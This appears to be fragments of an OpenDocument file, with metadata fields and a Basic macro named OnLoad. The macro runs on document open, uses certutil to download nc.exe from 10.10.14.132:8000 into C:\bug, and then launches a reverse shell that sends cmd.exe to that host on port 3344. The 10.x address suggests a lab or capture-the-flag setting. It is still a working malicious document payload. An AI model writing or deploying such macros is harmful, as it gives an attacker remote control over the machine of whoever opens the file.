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n3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2019-11-28T18:24:36.293000000</dc:date>
    <meta:editing-duration>PT18M</meta:editing-duration>
    <meta:editing-cycles>8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	Sub OnLoad
	 MkDir "C:\bug"
	 If Len(Dir("C:\bug", vbDirectory)) = 0 Then
     	 Shell("certutil.exe -urlcache -split -f 'http://10.10.14.132:8000/test.exe' .\nc.exe")
	 End If
	 Shell("certutil.exe -urlcache -split -f 'http://10.10.14.132:8000/nc.exe' C:\bug\nc.exe")
	 Shell("C:\bug\nc.exe 10.10.14.132 3344 -e cmd.exe")
	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